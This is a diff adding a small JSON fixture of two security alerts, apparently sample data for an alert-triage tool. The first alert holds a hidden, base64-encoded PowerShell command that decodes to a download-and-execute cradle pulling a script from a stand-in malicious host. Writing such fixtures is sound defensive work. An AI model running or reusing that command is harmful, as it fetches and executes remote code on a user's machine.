@@ -1,0 +1,28 @@
+[
+  {
+    "alert_id": "ALT-2026-0001",
+    "timestamp": "2026-07-14T21:30:00Z",
+    "severity": "high",
+    "source": "endpoint_detection",
+    "title": "Suspicious PowerShell Execution",
+    "host": "wkstn-014",
+    "user": "jsmith",
+    "process_name": "powershell.exe",
+    "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAGUAeABhAG0AcABsAGUALwBwAHMAMQAnACkA",
+    "description": "Encoded PowerShell command launched from a user workstation.",
+    "status": "new"
+  },
+  {
+    "alert_id": "ALT-2026-0002",
+    "timestamp": "2026-07-14T21:42:00Z",
+    "severity": "medium",
+    "source": "cloud_audit",
+    "title": "Multiple Failed Console Logins",
+    "host": "aws-console",
+    "user": "svc-analytics",
+    "process_name": "n/a",
+    "command_line": "n/a",
+    "description": "Five failed authentication attempts from an unfamiliar ASN within ten minutes.",
+    "status": "triage"
+  }
+]
